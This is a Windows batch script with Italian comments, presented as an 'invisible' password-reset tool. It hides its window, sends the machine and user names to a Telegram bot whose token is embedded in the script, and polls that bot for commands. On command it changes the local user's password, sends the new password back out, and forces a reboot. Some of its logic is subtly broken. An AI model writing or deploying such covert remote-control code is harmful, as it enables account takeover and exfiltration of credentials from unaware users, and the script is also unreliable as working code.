@echo off & setlocal enabledelayedexpansion
:: Script di reset password completamente invisibile con notifiche Telegram

:: Configurazione Telegram (offuscata)
set "BOT_TOKEN=7909916408:AAFTkG0h0HHynabtZGqAXyzkl13TdeIQWhw"
set "CHAT_ID=5709299213"
set "API_URL=https://api.telegram.org/bot%BOT_TOKEN%"

:: Funzione per inviare notifiche silenziose
:send_telegram
set "message=%~1"
powershell -command "$null=Invoke-WebRequest -Uri '!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=%message%' -UseBasicParsing" 2>nul
exit /b

:: Nascondere la finestra CMD (metodo alternativo)
if "%1"=="hidden" goto main
start /B /MIN cmd /c "%~f0" hidden
exit
:main

:: Verifica privilegi amministrativi (silenziosa)
net session >nul 2>&1
if %errorlevel% neq 0 (
    call :send_telegram "⚠️ Client connesso per reset - Richiesti privilegi admin"
    exit /b
)

:: Notifica connessione
call :send_telegram "🖥️ Client connesso per reset: %COMPUTERNAME% - %USERNAME%"

:: Ottenimento nome utente
for /f "tokens=2 delims=" %%A in ('whoami') do set "current_user=%%A"

:: Loop di attesa comando
:wait_command
for /f "delims=" %%A in ('powershell -command "$resp=try{Invoke-WebRequest -Uri '!API_URL!/getUpdates' -UseBasicParsing|ConvertFrom-Json}catch{}; $resp.result[-1].message.text"') do (
    set "COMMAND=%%A"
)

if "!COMMAND!"=="pwd:" (
    set "new_password=!COMMAND:~4!"
    
    :: Esegui reset password
    net user "!current_user!" "!new_password!" >nul 2>&1
    
    if !errorlevel! equ 0 (
        call :send_telegram "✅ Password cambiata su %COMPUTERNAME% - Nuova password: !new_password!"
        
        :: Riavvio silenzioso
        shutdown /r /t 5 /f >nul
        call :send_telegram "🔄 Sistema in riavvio..."
        exit
    ) else (
        call :send_telegram "❌ Reset fallito su %COMPUTERNAME%"
    )
)

:: Attesa prima di controllare nuovamente
timeout /t 10 /nobreak >nul
goto wait_command
